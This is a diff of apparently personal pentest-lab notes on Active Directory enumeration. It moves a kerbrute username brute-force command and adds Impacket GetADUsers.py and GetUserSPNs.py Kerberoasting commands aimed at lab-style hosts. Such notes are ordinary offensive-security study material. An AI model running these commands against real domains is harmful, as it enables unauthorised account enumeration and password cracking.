@@ -1,10 +1,5 @@
 
-### Kerbrute
 
->brute force for username using kerbrute
-```
-kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -t 100
-```
 ### LDAP
 
 **Lightweight Directory Access Protocol (LDAP) directories**. It allows you to search and retrieve information from an **Active Directory (AD) or LDAP server**, such as **users, groups, computers, and other directory objects**.
@@ -40,14 +35,25 @@ after obtainng some samAccountName "username" we can use this account to check i
 
 ```
 
+>brute force for username using kerbrute
+```
+kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.208.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -t 100
+```
 
+### Impacket
 
 ```sh
-#python script that **query Active Directory (AD) for user information** from a domain controller
+#query Active Directory (AD) for user information from a domain controller
 
 GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
 ```
 
+
+```sh
+# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords
+
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+```
 
 
 #### PowerView
@@ -104,7 +110,7 @@ bloodhound-python -u [usename] -p [password] -ns $ip  -d [domain] -c all
 
 
 ```sh
-#**ind Service Principal Names (SPNs)** in Active Directory (AD). These SPNs are linked to service accounts which attackers target for **Kerberoasting** attacks to crack passwords
+# Service Principal Names (SPNs) in Active Directory (AD). These SPNs are linked to service accounts which attackers target for Kerberoasting attacks to crack passwords
 
 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
 ```
